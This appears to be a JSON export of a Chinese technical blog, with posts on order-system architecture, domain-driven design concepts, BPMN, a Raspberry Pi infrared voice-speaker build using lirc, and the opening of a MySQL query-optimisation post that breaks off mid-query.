在交易过程中，订单、支付、会员是三个独立的服务，如果订单丢失了支付的消息或者会员丢失了订单的消息都会导致用户收不到会员权益。上一个问题中已经讲到最终一致性同步机制，可能因为中间件或者网络故障导致消息无法同步，这时可以再增加一个补偿机制，通过定时任务扫描未完成的订单，主动检查支付状态后去会员业务履约，这是兜底策略，可保障数据的最终一致。 业务沉淀从接收项目到现在也是对订单系统从懵懂到逐渐加深理解的一个过程，对于当前交易的业务和业务架构也有了一个理解。 交易系统本身作为支付系统的上层系统，提供商品管理能力、交易收单能力、履约核销能力。外围业务子系统主要关注业务内容资源的管理。业务的收单履约管理接入交易系统即可，可减轻业务的开发复杂度。收单流程展示如下： 业务定制商品详情页，然后通过详情页底栏调用端能力进入订单收银台。在这里客户端需要调用业务后端接口来获取商品详情，然后调用交易底栏的展示接口获取底部按钮的情况。 用户通过底部按钮进入收银台后，在收银台可以选择支付方式和优惠券，点击确认支付调起微信或者支付宝付款。收银台展示以及获取支付参数的接口由交易系统提供。 订单后台确认收款后会通知业务履约，用户端会回到详情页，用户在详情页进入内容播放页享受权益。履约核销流程是业务后端与交易系统后端的接口调用来完成的。 现在知乎站内主要是虚拟商品的交易，一个通用的交易流程如下图： 用户经历了从商品的浏览到进入收银台下单支付，再回到内容页消费内容。随着业务的发展，不同的交易场景和交易流程叠加，系统开始变得复杂，一个交易的业务架构慢慢呈现。 订单系统主要承载知乎站内站外的各种交易服务，提供稳定可靠的交易场景支撑。主要分为以下几个部分： 首先产品服务层是面向用户能感受到的交互界面，提供对于这些页面的统一下单支付 API 网关。 然后是订单服务层，由上层网关调用，提供着不同场景下的交易服务支撑。 再往下是订单领域层，承载订单最核心逻辑代码，首先是用户购买需要的算价聚合，然后是管理订单模型的交易聚合，最后是买完商品后的履约处理的交付聚合。 最底层是基础支撑服务层，主要是提供基本的服务支持以及交易依赖的一些服务。 最后是运营服务，提供交易相关的后台功能支持。 方法论实践凡此以上，不论系统迁移方案还是架构理解都归结于参与人员的理解与认知，一个优秀的方案或合适的架构不是设计出来的，是迭代出来的。人的认知也是这样，需要不断的迭代升级，和很多的方法论一样，PDCA 循环为我们提炼了一个提升路径。 Plan 计划，明确我们迁移的目标，调研现状指定计划。 Do 执行，实现计划中的内容。 Check 检查，归纳总结，分析哪些做好了，还有什么问题。 Action 调整，总结经验教训，在下一个循环中解决。 很多时候，也许你只做了前两步，但其实后两步对你的提升会有很大帮助。所以一个项目的复盘，一次 Code Review 很重要，有语言的交流和碰撞才更容易打破你的固有思维，做到业务认知的提升。 参考文章https://mp.weixin.qq.com/s/eKc8qoqNCgqrnont2nYNgAhttps://zhuanlan.zhihu.com/p/138222300https://blog.csdn.net/g6U8W7p06dCO99fQ3/article/details/103415254 招聘信息知乎技术团队大量岗位持续招聘中，欢迎感兴趣的同学加入我们，可投简历至：&#x6c;&#x75;&#111;&#x68;&#x75;&#x69;&#106;&#x75;&#97;&#110;&#64;&#122;&#104;&#x69;&#x68;&#117;&#46;&#x63;&#111;&#x6d;","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"订单系统建模思考","slug":"关于技术/系统经验/订单系统建模思考","date":"2021-01-30T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/01/30/1.html","link":"","permalink":"https://noogel.xyz/2021/01/30/1.html","excerpt":"","text":"本文是对于订单建模的一点思考整理，里面应用一些对领域驱动设计的思考，默认读者对于领域概念有一些基本了解。 基本元素交易最早是通过以物易物的方式来交换，后面产生等价通用物品即货币。交易上下文领域对象包括： 1234顾客 Consumer货 Goods货币 Currency商家 Merchant 对于交易一句话描述就是，顾客在商家那里通过等价货币购换取了货物。 上面描述的四种领域对象作为领域实体，每一种领域实体通过 key 组合来确定实体的唯一性，ext 是值对象，用来描述实体。对应的实体描述如下： 12345678910111213141516171819202122Consumer:&#123; &quot;key&quot;: &quot;USER_ID&quot;, &quot;ext&quot;: &#123; &#125;&#125;Goods&#123; &quot;key&quot;: &quot;SKU_ID&quot;, &quot;amount&quot;: 100, &quot;ext&quot;: &#123; &#125;&#125;Currency&#123; &quot;type&quot;: &quot;CNY|VIRTUAL_COIN&quot;, &quot;amount&quot;: 100&#125;Merchant&#123; &quot;key&quot;: &quot;yO7LmcWjqsJz1N5j&quot;, &quot;ext&quot;: &#123; &#125;&#125; 状态事件抽象订单状态变更命令通用流程抽象如下图，一个领域命令被触发后，首先进行状态变更前的资格校验事件回调，所有校验方均校验通过后方可进行后续处理，将交易修改为对应状态，状态修改后发布对应的状态变更事件，经由事件总线发布事件，所有监听方进行后续处理。一个领域命令执行结束。此流程可以套用到任何状态变更命令。 状态变化通过领域命令发起 command，首先进行 BeforeOperating 操作前的处理，每一个命令都定义了事件的资格校验 qualification 接口，实现接口的可能是子域内处理，比如下单的库存校验，优惠校验等，也可能是具体业务的校验，需要实现资格校验接口。通过后进行事务性的状态变更操作 updateState，操作后进行状态变更后 AfterOperating 的事件发布，由各个业务监听进行后续处理。这样处理方便业务逻辑解耦，订单子域专注于订单状态的管理。 对应到订单系统，对于订单状态和物流状态节点以及领域事件如下表示： 订单状态 已创建 CREATE(COMMIT) 已支付 PAID 已退款 REFUND(REFUNDING) 已关闭 CLOSED 物流状态 待发货 WAITING 已发货 DELIVERED 已收货 RECEIVED 已退货 RETURN 领域命令 创建订单 createOrder 超时关单 closeOrder 支付订单 payOrder 申请退款 refundOrder 订单履约 deliverOrder 商家发货 deliverGoods 用户收货 receiveGoods 用户退货 returnGoods 子域拆分订单子域的拆分也是业务职责的拆分，订单管理和物流管理是相对独立的两个模块，订单主要关注收款履约退款，物流主要关注用户的收退货状态，所以整个交易域的订单和物流会被拆分成两个子域。 订单事件举例订单创建命令，首先对注册的条件回调方进行回调，确认当前的购买资格，通过后进行事务性的订单创建，创建后进行订单已创建的事件发布，所有监听方接收到消息后进行分析处理。","categories":[],"tags":[{"name":"系统建模","slug":"系统建模","permalink":"https://noogel.xyz/tags/%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/"}]},{"title":"业务流程模型和标记法（BPMN）","slug":"关于技术/效率/BPMN业务流程模型和标记法","date":"2021-01-27T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2021/01/27/1.html","link":"","permalink":"https://noogel.xyz/2021/01/27/1.html","excerpt":"","text":"BPMN 有什么优势呢，用了一段时间主要使用在业务流程表达上，表达符号比较多，相比流程图可以更清楚的表达业务流程，同步、异步，异常中断、事件消息等等，如果看图的人都对这些符号有概念，可以比较轻松的看懂业务流程。缺点就是符号太多，学习成本相对高一些。学会了就会对业务表达上有很好的助力。 范围BPMN仅限于支持对业务流程有用的建模概念。这意味着组织所做的非业务目的其他类型建模将排除在BPMN之外。例如，以下方面的建模不属于BPMN的一部分： 组织结构 职能分解 数据模型 此外，虽然BPMN会显示数据的流（消息）以及活动与数据器物的关联，但它并非数据流图（data flow diagram）。 要素BPMN用很小一套图形要素做简单的图来建模，这将令业务用户与开发者一样容易理解其中的过程和流。它的四种基本要素如下： 流对象（Flow Object）：事件（Events），活动（Activities），关口（Gateways） 连接对象（Connecting Objects）：顺序流（Sequence Flow），消息流（Message Flow），关联（Association） 泳道（Swimlanes）：池（Pool），道（Lane） 器物（Artifacts&#x2F;Artefacts）：数据对象（Data Object），组（Group），注释（Annotation） 这四大类对象令我们有机会做出简单的业务流程图（BPD, business process diagram）。同时，BPMN也允许在BPD中创建你自己的流对象、器物类型，使图更好理解。 流对象与连接对象 泳道与器物 业务流程图的类型 常用符号 免费画 BPMN 流程图的工具https://app.diagrams.net/ 参考https://github.com/Pingren/bpmn-dataflow-diagram-editorhttps://github.com/zhangqiangboss/WorkflowAndCamunda/blob/master/docs/camunda/CamundaProEngine.mdhttps://www.edrawsoft.cn/bpmn-symbols/","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"领域基本概念字典","slug":"关于技术/领域驱动设计/领域基本概念字典","date":"2021-01-15T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/01/15/1.html","link":"","permalink":"https://noogel.xyz/2021/01/15/1.html","excerpt":"","text":"领域驱动设计中定义了超多的概念，如果不多找几篇资料综合的去看，正确的理解比较困难，下面搜集整理了大部分的领域驱动中的概念，并加以理解描述。 战略设计与战术设计战略设计主要从业务视角出发，建立业务领域模型，划分领域边界，建立通用语言的限界上下文，限界上下文可以作为微服务设计的参考边界。它是从高层事业来绅士我们的软件系统。从战略设计角度来看，一套基础的电商业务应该包含如下领域，支付域、交易域、商品域、库存域、履约域。不同领域之间通过界限上下文来划分边界。 战术设计则从技术视角出发，侧重于领域模型的技术实现，完成软件开发和落地，包括：聚合根、实体、值对象、领域服务、应用服务和资源库等代码逻辑的设计和实现。它主要关注的是技术层面的实施，也是对我们程序员最实在的地方。战术设计的具体落地案例在后面的内容中会讲解。 领域 &amp; 子领域DDD 的领域就是这个边界内要解决的业务问题域。既然领域是用来限定业务边界和范围的，那么就会有大小之分，领域越大，业务范围就越大，反之则相反。领域可以进一步划分为子领域。我们把划分出来的多个子领域称为子域，每个子域对应一个更小的问题域或更小的业务范围。 核心域 &amp; 通用域 &amp; 支撑域在领域不断划分的过程中，领域会细分为不同的子域，子域可以根据自身重要性和功能属性划分为三类子域，它们分别是：核心域、通用域和支撑域。决定产品和公司核心竞争力的子域是核心域，它是业务成功的主要因素和公司的核心竞争力。没有太多个性化的诉求，同时被多个子域使用的通用功能子域是通用域。还有一种功能子域是必需的，但既不包含决定产品和公司核心竞争力的功能，也不包含通用功能的子域，它就是支撑域。 基于以上概念定义，对订单域进行如下的拆分，其中交易子域和算价子域是最关键的核心子域，限购子域、交付子域、报表子域、会员订阅子域是支撑子域，消息子域为沟通各个子域的桥梁分类为通用子域。注意这里的曲线只是用来区分不同子域类型，不是界限上下文。 事件风暴事件风暴是一项团队活动，领域专家与项目团队通过头脑风暴的形式，罗列出领域中所有的领域事件，整合之后形成最终的领域事件集合，然后对每一个事件，标注出导致该事件的命令，再为每一个事件标注出命令发起方的角色。命令可以是用户发起，也可以是第三方系统调用或者定时器触发等，最后对事件进行分类，整理出实体、聚合、聚合根以及限界上下文。而事件风暴正是 DDD 战略设计中经常使用的一种方法，它可以快速分析和分解复杂的业务领域，完成领域建模。 通用语言 &amp; 界限上下文在 DDD 领域建模和系统建设过程中，有很多的参与者，包括领域专家、产品经理、项目经理、架构师、开发经理和测试经理等。对同样的领域知识，不同的参与角色可能会有不同的理解，那大家交流起来就会有障碍，怎么办呢？因此，在 DDD 中就出现了“通用语言”和“限界上下文”这两个重要的概念。这两者相辅相成，通用语言定义上下文含义，限界上下文则定义领域边界，以确保每个上下文含义在它特定的边界内都具有唯一的含义，领域模型则存在于这个边界之内。 通用语言团队交流达成共识的能够明确简单清晰的描述业务规则和业务含义的语言就是通用语言。解决各岗位的沟通障碍问题，促进不同岗位的和合作，确保业务需求的正确表达。通用语言贯穿于整个设计过程，基于通用语言可以开发出可读性更好的代码，能准确的把业务需求转化为代码。 界限上下文用来封装通用语言和领域对象，提供上下文环境，保证在领域之内的一些术语、业务相关对象等（通用语言）有一个确切的含义，没有二义性。这个边界定义了模型的适用范围，使团队所有成员能够明确地知道什么应该在模型中实现，什么不应该在模型中实现。 栗子说明在商品域，商品实体则对应着一个具体的 SKU 商品，包含着标题和金额，如现在的课程、会员服务。在订单域中的商品实体并不等同域商品域中的实体，比如可以将优惠券做成可以被售卖的商品，coupon_no 就是 product_key，具有 non-consumable 属性；或者将付费咨询的用户服务打包成商品售卖，那么 member_id 就能映射成 producer_key，并且觉有 consumable 属性。界限上下文就是区分不同领域下的领域对象，划定了领域对象含义的边界。在订单域中，商品实体默认可以是商品系统 SKU，也可以是优惠券和用户服务等。 上下文映射图上下文映射图就通过画图的方式展示N（N&gt;&#x3D;2）个上下文之间的映射关系。 ACL表示防腐层，OHS表示开放主机服务，PL表示发布语言，U代表上游，D代表下游。 领域服务你是否遇到过这样的问题：想建模一个领域概念，把它放在实体上不合适，把它放在值对象上也不合适，然后你冥思苦想着自己的建模方式是不是出了问题。恭喜你，祝贺你，你的建模手法完全没有问题，只是你还没有接触到领域服务（Domain Service）这个概念，因为领域服务本来就是来处理这种场景的。比如，要对客户端类型和版本进行判断是否支持某一项功能，我们可以创建一个 ClientVersionService 来负责。值得一提的是，领域服务和上文中提到的应用服务是不同的，领域服务是领域模型的一部分，而应用服务不是。应用服务是领域服务的客户，它将领域模型变成对外界可用的软件系统。 领域事件在DDD中，领域事件便可以用于处理上述问题，此时最终一致性取代了事务一致性，通过领域事件的方式达到各个组件之间的数据一致性。领域事件的命名遵循英语中的“名词+动词过去分词”格式，即表示的是先前发生过的一件事情。比如，购买者提交商品订单之后发布 OrderCreated 事件，用户支付 TradePaid 事件。需要注意的是，既然是领域事件，他们便应该从领域模型中发布。领域事件的最终接收者可以是本限界上下文中的组件，也可以是另一个限界上下文。领域事件的额外好处在于它可以记录发生在软件系统中所有的重要修改，这样可以很好地支持程序调试和商业智能化。另外，在CQRS架构的软件系统中，领域事件还用于写模型和读模型之间的数据同步。再进一步发展，事件驱动架构可以演变成事件源（Event Sourcing），即对聚合的获取并不是通过加载数据库中的瞬时状态，而是通过重放发生在聚合生命周期中的所有领域事件完成。 实体 &amp; 值对象 &amp; 聚合 &amp; 聚合根实体 &amp; 值对象实体和值对象是组成领域模型的基础单元。在 DDD 中有这样一类对象，它们拥有唯一标识符，且标识符在历经各种状态变更后仍能保持一致。对这些对象而言，重要的不是其属性，而是其延续性和标识，对象的延续性和标识会跨越甚至超出软件的生命周期。我们把这样的对象称为实体。通过对象属性值来识别的对象，它将多个相关属性组合为一个概念整体。在 DDD 中用来描述领域的特定方面，并且是一个没有标识符的对象，叫作值对象。值对象本质就是一个集合，可以保证属性归类的清晰和概念的完整性。 举例说明 消费者实体原本包括：ID、昵称、注册手机号、姓名以及人员所在的省、市、县和街道等属性。这样显示地址相关的属性就很零碎了对不对？现在，我们可以将“省、市、县和街道等属性”拿出来构成一个“地址属性集合”，这个集合就是值对象了。 聚合 &amp; 聚合根聚合是业务和逻辑紧密关联的实体和值对象组合而成，聚合是数据修改和持久化的基本单元，一个聚合对应一个数据的持久化。聚合在DDD分层架构中属于领域层，领域层包含了多个聚合，共同实现核心业务逻辑，聚合内的实体以充血模型实现个体业务能力，以及业务逻辑的高内聚。跨多个实体的业务逻辑通过领域服务来实现，跨多个聚合的业务逻辑通过应用服务来实现。如果把聚合比作组织，聚合根则是组织的负责人，聚合根也叫做根实体，它不仅仅是实体，还是实体的管理者。聚合之间通过聚合根关联引用，如果需要访问其他聚合的实体，先访问聚合根，再导航到聚合内部的实体。即外部对象不能直接访问聚合内的实体。 举例说明 上图说明聚合与聚合根的关系，交易聚合有一个唯一的聚合根交易单，交易单组织了消费者实体、商品实体、商铺实体、优惠券实体同时消费金额之对象。下面具体对比说明下： 聚合的特点：高内聚、低耦合，它是领域模型中最底层的边界，可以作为拆分微服务的最小单位，但我不建议你对微服务过度拆分。但在对性能有极致要求的场景中，聚合可以独立作为一个微服务，以满足版本的高频发布和极致的弹性伸缩能力。一个微服务可以包含多个聚合，聚合之间的边界是微服务内天然的逻辑边界。有了这个逻辑边界，在微服务架构演进时就可以以聚合为单位进行拆分和组合了，微服务的架构演进也就不再是一件难事了。聚合根的特点：聚合根是实体，有实体的特点，具有全局唯一标识，有独立的生命周期。一个聚合只有一个聚合根，聚合根在聚合内对实体和值对象采用直接对象引用的方式进行组织和协调，聚合根与聚合根之间通过 ID 关联的方式实现聚合之间的协同。实体的特点：有 ID 标识，通过 ID 判断相等性，ID 在聚合内唯一即可。状态可变，它依附于聚合根，其生命周期由聚合根管理。实体一般会持久化，但与数据库持久化对象不一定是一对一的关系。实体可以引用聚合内的聚合根、实体和值对象。值对象的特点：无 ID，不可变，无生命周期，用完即扔。值对象之间通过属性值判断相等性。它的核心本质是值，是一组概念完整的属性组成的集合，用于描述实体的状态和特征。值对象尽量只引用值对象。 防腐层通过在遗留系统和现代系统之间使用防腐层来隔离它们。该层转换两个系统之间的通信，允许遗留系统保持不变，同时可以避免损害现代应用程序的设计和技术方法。 现代应用与防腐层之间的通信始终使用应用程序的数据模型和架构。从防腐层到遗留系统的调用都符合该系统的数据模型或方法。 防腐层包含两个系统之间转换所需的所有逻辑。该层可以作为应用程序中的组件或作为独立服务来实现。 贫血模型贫血模型就是模型对象之间存在完整的关联(可能存在多余的关联)，但是对象除了get和set方外外几乎就没有其它的方 法，整个对象充当的就是一个数据容器，用C语言的话来说就是一个结构体，所有的业务方法都在一个无状态的Service类中实现，Service类仅仅包 含一些行为。贫血模型的优点是很明显的： 被许多程序员所掌握，许多教材采用的是这种模型，对于初学者，这种模型很自然，甚至被很多人认为是java中最正统的模型。 它非常简单，对于并不复杂的业务(转帐业务)，它工作得很好，开发起来非常迅速。它似乎也不需要对领域的充分了解，只要给出要实现功能的每一个步骤，就能实现它。 事务边界相当清楚，一般来说service的每个方法都可以看成一个事务，因为通常Service的每个方法对应着一个用例。（在这个例子中我使用了facade作为事务边界，后面我要讲这个是多余的)其缺点为也是很明显的： 所有的业务都在service中处理，当业越来越复杂时，service会变得越来越庞大，最终难以理解和维护。 将所有的业务放在无状态的service中实际上是一个过程化的设计，它在组织复杂的业务存在天然的劣势，随着业务的复杂，业务会在service中多个方法间重复。 当添加一个新的UI时，很多业务逻辑得重新写。例如，当要提供Web Service的接口时，原先为Web界面提供的service就很难重用，导致重复的业务逻辑（在贫血模型的分层图中可以看得更清楚），如何保持业务逻辑一致是很大的挑战。 领域模型领域模型是对领域内的概念类或现实世界中对象的可视化表示。又称概念模型、领域对象模型、分析对象模型。它专注于分析问题领域本身，发掘重要的业务领域概念，并建立业务领域概念之间的关系。领域驱动模型，与贫血模型相反，领域模型要承担关键业务逻辑，业务逻辑在多个领域对象之间分配，而Service只是完成一些不适合放在模型中的业务逻辑，它是非常薄的一层，它指挥多个模型对象来完成业务功能。其优点是： 领域模型采用OO设计，通过将职责分配到相应的模型对象或Service，可以很好的组织业务逻辑，当业务变得复杂时，领域模型显出巨大的优势。 当需要多个UI接口时，领域模型可以重用，并且业务逻辑只在领域层中出现，这使得很容易对多个UI接口保持业务逻辑的一致(从领域模型的分层图可以看得更清楚)。其缺点是： 对程序员的要求较高，初学者对这种将职责分配到多个协作对象中的方式感到极不适应。 领域驱动建模要求对领域模型完整而透彻的了解，只给出一个用例的实现步骤是无法得到领域模型的，这需要和领域专家的充分讨论。错误的领域模型对项目的危害非常之大，而实现一个好的领域模型非常困难。 对于简单的软件，使用领域模型，显得有些杀鸡用牛刀了。 开放主机服务该模式可以通过REST实现。通常来讲，我们可以将开放主机服务看作是远程过程调用（RPC）的API。同时，也可以通过消息机制实现。 参考https://www.cnblogs.com/snidget/p/12995676.htmlhttps://zhuanlan.zhihu.com/p/130945830https://blog.csdn.net/itfly8/article/details/109554847https://www.cnblogs.com/netfocus/archive/2011/10/10/2204949.htmlhttps://iambowen.gitbooks.io/cloud-design-pattern/content/patterns/anti-corruption-layer.html","categories":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/categories/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/tags/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}]},{"title":"小米粥声控音箱总体计划","slug":"关于技术/小米粥声控音箱总体计划","date":"2020-09-07T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2020/09/07/1.html","link":"","permalink":"https://noogel.xyz/2020/09/07/1.html","excerpt":"","text":"关注树莓派很久了，只是没有很感兴趣的应用场景，就没有买来玩。几个月前偶然得到一个小度音箱，发现了新大陆，各种语音控制功能，便捷性不言而喻，还买了一些外部设备可以通过小度控制，发现有红外遥控器可以控制家里的大部分红外家电，奈何码库不是很全，有些设备还是不能控制的，而且不支持定制功能。恰好在知乎看到了一些 geek 视频，想着自己也做一个，可以支持红外数据的定制，做到自由遥控。于是乎说干就干，从一个什么硬件都不懂的小白一步步的了解了点硬件知识，软件部分相对好实现一些。主要计划的功能是通过语音来控制红外家电、温湿度监控以及智能提醒等功能，先完成主体框架然后再不断开发插件形式来增强可玩性。 计划主要分为两个子系统： 软件子系统，主要实现语音到文字和文字到语音的转换，逻辑功能的处理等。 硬件子系统提供收音、音箱、温湿度传感器、红外收发、系统供电等能力的支持。 总体功能点进度如下： ok 显示，信息简单展示界面，计划采用 OLED12832 屏。 ok 收音，收集外接语音信息。 ok 音响，输出系统响应结果。 温湿度，收集设备所处环境的温度和湿度。 ok 风扇，硬件系统散热。 ok 红外收&#x2F;发，红外设备系统的录入和红外信号的发射，用于控制红外家电。 供电模块，给音响和树莓派硬件供电。 ok pcb 电路版设计，传感器集成。 3d 打印外壳，最后根据硬件的排列情况定制一个简洁的外壳。 ok 语音汉字互转，计划采用讯飞 API 接口实现，后面尝试做简单的语音识别模型。 ok 逻辑控制和输出输入设备控制模块，基于硬件传感器数据的采集和信息的归纳整理能力。 硬件部分一直以来都是做的软件，这次从 0 到 1 一点点学的硬件，到 PCB 打样，焊板。没有遵循设计规范，只是按照能用的级别做的。 v0.2 实验数据收集 树莓派4 GPIO 引脚 一、电源输出引脚 3v3、5v代表：3.3伏特和5伏特，是输出供电的正极，也就是我们常说的Vcc GND代表接地和输出供电的负极 特别注意：每个引脚最大输出电流为16毫安(mA)，且同一时刻所有引脚的总输出电流不超过51毫安 二、GPIO GPIO（General Purpose I&#x2F;O Ports）意思为通用输入&#x2F;输出端口，通俗地说，就是一些引脚，可以通过它们输出高低电平或者通过它们读入引脚的状态-是高电平或是低电平。GPIO是个比较重要的概念，用户可以通过GPIO口和硬件进行数据交互（如UART），控制硬件工作（如LED、蜂鸣器等），读取硬件的工作状态信号（如中断信号）等。GPIO口的使用非常广泛。掌握了GPIO，差不多相当于掌握了操作硬件的能力。树莓派有26个GPIO接口，其中有一部分是复用接口。 引脚3、5为IC总线复用接口 引脚7为（GCLK）全局时钟引脚复用接口 引脚19、21、23为SPI总线复用接口 引脚8、10为串口复用接口，TX发送，RX接收 引脚12、32、33、35为PWM复用接口 三、IC总线 IC是内部整合电路的称呼，是一种串行通讯总线，使用多主从架构，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边装置而发展。IC的正确读法为”Inter－Integrated Circuit” 。 SDA：数据线 SCL：时钟线 四、SPI总线 SPI是串行外设接口（Serial Peripheral Interface）的缩写，是一种高速的，全双工，同步的通信总线，并且在芯片的管脚上只占用四根线，节约了芯片的管脚，同时为PCB的布局上节省空间，提供方便，正是出于这种简单易用的特性，如今越来越多的芯片集成了这种通信协议。 MISO：数据输入 MOSI：数据输出 SCLK：时钟信号 SS：使能信号 五、UART总线 UART是一种通用串行数据总线，用于异步通信。该总线双向通信，可以实现全双工传输和接收。在嵌入式设计中，UART用于主机与辅助设备通信，如汽车音响与外接AP之间的通信，与PC机通信包括与监控调试器和其它器件，如EEPROM通信。可以理解为计算机的串口。RS232、TTL。 RX是接收 TX是发送 六、PWM脉冲宽度调制 脉冲宽度调制是一种模拟控制方式，其根据相应载荷的变化来调制晶体管基极或MOS管栅极的偏置，来实现晶体管或MOS管导通时间的改变，从而实现开关稳压电源输出的改变。这种方式能使电源的输出电压在工作条件变化时保持恒定，是利用微处理器的数字信号对模拟电路进行控制的一种非常有效的技术。脉冲宽度调制是利用微处理器的数字输出来对模拟电路进行控制的一种非常有效的技术，广泛应用在从测量、通信到功率控制与变换的许多领域中。 AD 教程AD 使用与硬件电路图画图和PCB图设计使用的。主要是看了B站的一个入门视频教程，然后再不断搜搜改改来实现的。 https://blog.csdn.net/wxh0000mm/article/details/70237722https://www.bilibili.com/video/av94518044?p=1https://www.zhihu.com/question/32069273 单位转换 1.0mil &#x3D; 0.025mm 1.2mil &#x3D; 0.030mm 1.25mil &#x3D; 0.032mm DHT11 温湿度传感器下面是温湿度传感器的基本电路图，这里本来是3pin方案到树莓派的，板子上也画好了，只不过在焊接的时候没有处理好，现在系统始终无法正确读数，只是在测试期间能正常读。 https://shumeipai.nxez.com/2019/10/06/reading-temperature-and-humidity-from-dht11-with-raspberry-pi.html OLED 12832这里使用了 Adafruit_Python_SSD1306 库来驱动液晶屏显示。 https://shumeipai.nxez.com/2019/04/29/use-the-ssd1306-oled-display-on-the-raspberry-pi.html IR 收发红外发射图，这里只画了两个，实际我是配置了4个红外发射二极管，限流电阻调整成 100R。 红外接收图，这里直接使用已经简单封装的传感器 IR的收发是主要调试的功能： 红外录入功能使用：安装 Linux 下的红外控制库： 12sudo apt-get updatesudo apt-get install lirc 更新 /boot/config.txt 文件来开启红外收发接口： 12# Uncomment this to enable the lirc-rpi moduledtoverlay=lirc-rpi,gpio_out_pin=17,gpio_in_pin=18,gpio_in_pull=up 更新 /etc/lirc/lirc_options.conf 文件来控制当前是接收模式还是发射模式，修改完重启服务生效： 1device=/dev/lirc0 测试能否正常接收到红外信号： 12345678mode2 -d /dev/lirc0space 16777215pulse 8999space 4457pulse 680space 1627...... 可以通过 lirc 录制简单的红外设备生成遥控文件，如果空调这种比较复杂的不太好弄。 1234567# 查看按键名称，这里一个红外码是绑定到一个按键上的，你需要找一些你录制的按键然后记下来。irrecord -l# 开启录制命令，这个录制过程比较复杂，需要先判断环境噪音，然后随机按键，最后才是录制按键，而我的有些红外设备按键无法录上有点奇怪，目前只有台灯的录进去了。irrecord ~/lircd.conf# 如果有问题可以录制 raw codeirrecord -f ~/lircd.conf 录制好的文件内容像下面这样，如果没有内容则说明没有录制上。 12345678910111213141516171819202122232425begin remote name myir flags RAW_CODES|CONST_LENGTH eps 30 aeps 100 gap 108055 begin raw_codes name KEY_1 9062 4462 621 531 627 532 626 531 626 532 629 531 601 556 627 531 628 530 628 1610 629 1611 603 1636 603 1636 629 1612 629 1609 631 1609 630 1610 627 1612 630 530 629 1608 629 532 626 534 625 532 628 1609 629 532 628 529 630 1609 629 530 626 1612 629 1610 629 1610 629 540 633 1596 629 name KEY_2 9067 4455 632 528 630 528 633 524 631 529 630 529 630 528 630 530 630 528 最后要把录制的文件内容复制到对应目录，重启，让 lirc 服务能加载上： 1sudo cp ~/xx.lircd.conf /etc/lirc/lircd.d/xx.lircd.conf 实际上发送按键需要执行的命令包含你复制的文件名（device-name）以及按键名（KEY_1）： 1irsend SEND_ONCE &lt;device-name&gt; KEY_1 红外输入输出参考 https://www.pythonheidong.com/blog/article/191812/https://www.jianshu.com/p/96f16846dfa3https://segmentfault.com/a/1190000014135418https://www.jianshu.com/p/9cfb0bf02006https://www.cnblogs.com/huanglufei/articles/5562330.htmlhttps://www.jianshu.com/p/abdcd3e06726 软件部分简单的将软件部分分为前台功能和后台功能，前台功能主要是面向用户使用层面，后台功能主要是配置相关功能。 前台功能分为三个模块，输入模块、逻辑处理模块和输出模块。 其中热词唤醒方案使用的 snowboy ，语音文字互转采用的讯飞免费接口，后面可以考虑实现一些简单的部分。 按照这个方案，后续只要不断配置和扩展功能即可，主要处理流程不会有太大变化产生。 语音部分参考 https://www.jianshu.com/p/a1c06020f5fdhttps://www.cnblogs.com/lovesKey/p/11080448.htmlhttps://www.cnblogs.com/DragonFire/p/9212935.htmlhttps://www.xfyun.cn/doc/asr/voicedictation/API.htmlhttps://www.xfyun.cn/doc/tts/online_tts/API.htmlhttps://www.xfyun.cn/doc/asr/voicedictation/Audio.html 软件部分目前不打算公开，主要写的太烂。等优化后再放出来。 总结目前一期实现了核心部分的功能，可以语音控制普通红外家电，耗时有两周（晚上），目前的时间精力上也只能做到这样，毕竟工作和生活还要占据绝大部分时间的。使用上流程比较简单，插电开机自启动后就可以了，只是语音和音箱部分还没有很方便的集成到整个项目里面。下一期做的时候计划优化电路，支持更多的传感器，然后把麦和音箱集成进去，再做一个外壳。整个项目从计划到实施还是学到了一些，主要是硬件方面上的了解，电路原理图、PCB画图打样、硬件电路 IO 接口标准等，软件部分并没有太多的实践，准备放到三期做软件层面的优化，把外部 API 调用改成自己训练的语音模型。","categories":[],"tags":[{"name":"项目","slug":"项目","permalink":"https://noogel.xyz/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"MySQL语句优化分析","slug":"关于技术/中间件/MySQL语句优化","date":"2020-07-13T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2020/07/13/1.html","link":"","permalink":"https://noogel.xyz/2020/07/13/1.html","excerpt":"","text":"环境1234567891011CREATE TABLE `people` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(16) DEFAULT NULL, `pass` varchar(256) DEFAULT NULL, `card` varchar(32) DEFAULT NULL, `age` int(11) NOT NULL, `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`), UNIQUE KEY `card_UNIQUE` (`card`), KEY `name_age_key` (`name`,`age`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; 插入十一万条随机数据 1INSERT INTO `people` (`name`,`pass`,`card`,`age`) VALUES (&#x27;强欣笑&#x27;,&#x27;eSbJgrXAVjEy&#x27;,&#x27;143185791961386356&#x27;,53), ... ; EXPLAIN 查询计划 https://www.cnblogs.com/DataArt/p/10215663.html OPTIMIZER_TRACE 使用1234567891011121314151617181920212223242526-- 1. 打开 optimizer_trace功能，默认是关着的SHOW VARIABLES LIKE &#x27;optimizer_trace&#x27;;SET optimizer_trace=&quot;enabled=on&quot;;-- 2. 执行查询SELECT name, count(*) 